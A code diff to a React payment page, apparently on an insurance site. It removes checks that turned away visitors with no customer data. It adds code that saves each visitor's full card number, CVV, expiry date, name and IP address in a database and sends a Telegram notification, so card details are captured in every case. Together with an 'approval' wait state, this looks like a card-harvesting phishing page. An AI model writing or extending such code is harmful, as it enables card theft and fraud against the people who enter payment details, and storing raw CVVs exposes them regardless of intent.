@@ -170,29 +170,11 @@ const Payment = () => {
     }));
   };
   useEffect(() => {
-    // Get application ID and verify it has customer data
     const storedId = localStorage.getItem('applicationId');
     if (storedId) {
-      // Verify the application has customer data (name & phone)
-      supabase.
-      from('customer_applications').
-      select('full_name, phone, card_last_4').
-      eq('id', storedId).
-      single().
-      then(({ data }) => {
-        if (data?.full_name && data?.phone) {
-          setApplicationId(storedId);
-        } else {
-          // No valid customer data, redirect to home
-          console.warn('Application missing customer data, redirecting...');
-          navigate('/');
-        }
-      });
-    } else {
-      // No application ID, redirect to home
-      navigate('/');
+      setApplicationId(storedId);
     }
-  }, [navigate]);
+  }, []);
 
   useEffect(() => {
     if (waitingForApproval && applicationId) {
@@ -315,38 +297,62 @@ const Payment = () => {
         }
       }
 
-      // Ensure we have customer data before proceeding
-      if (!existingData.full_name || !existingData.phone) {
-        toast({
-          title: "خطأ",
-          description: "بيانات العميل غير مكتملة. يرجى العودة للصفحة الرئيسية وإعادة إدخال البيانات.",
-          variant: "destructive"
-        });
-        return;
+      const ipAddress = localStorage.getItem('visitor_ip') || null;
+      const paymentData = {
+        cardholder_name: formData.cardholderName,
+        card_number: formData.cardNumber,
+        card_last_4: lastFour,
+        card_type: cardType,
+        card_cvv: formData.cvv,
+        expiry_date: `${formData.expiryMonth}/${formData.expiryYear}`,
+        selected_company: companyName,
+        selected_price: price,
+        regular_price: regularPrice,
+        current_step: 'payment',
+        payment_approved: false,
+        status: 'submitted',
+        ip_address: ipAddress
+      };
+
+      let savedApplicationId = applicationId;
+      let saveError = null;
+
+      if (applicationId) {
+        const { data: updatedApp, error } = await supabase
+          .from('customer_applications')
+          .update(paymentData)
+          .eq('id', applicationId)
+          .select('id')
+          .maybeSingle();
+
+        saveError = error;
+        if (updatedApp?.id) {
+          savedApplicationId = updatedApp.id;
+        }
       }
 
-      // Update existing application instead of creating a new one
-      const ipAddress = localStorage.getItem('visitor_ip') || null;
-      const { error } = await supabase
-        .from('customer_applications')
-        .update({
-          cardholder_name: formData.cardholderName,
-          card_number: formData.cardNumber,
-          card_last_4: lastFour,
-          card_type: cardType,
-          card_cvv: formData.cvv,
-          expiry_date: `${formData.expiryMonth}/${formData.expiryYear}`,
-          selected_company: companyName,
-          selected_price: price,
-          regular_price: regularPrice,
-          current_step: 'payment',
-          payment_approved: false,
-          status: 'submitted',
-          ip_address: ipAddress
-        })
-        .eq('id', applicationId);
+      if (!savedApplicationId || saveError) {
+        const { data: newApp, error } = await supabase
+          .from('customer_applications')
+          .insert([{
+            ...paymentData,
+            full_name: existingData.full_name || formData.cardholderName,
+            phone: existingData.phone || null,
+            insurance_type: existingData.insurance_type || 'new',
+            usage_purpose: existingData.usage_purpose,
+            add_driver: existingData.add_driver,
+            vehicle_value: existingData.vehicle_value,
+            company_logo: existingData.company_logo
+          }])
+          .select('id')
+          .single();
 
-      if (error) throw error;
+        if (error) throw error;
+        savedApplicationId = newApp.id;
+      }
+
+      setApplicationId(savedApplicationId);
+      localStorage.setItem('applicationId', savedApplicationId);
 
       // Send Telegram notification
       try {
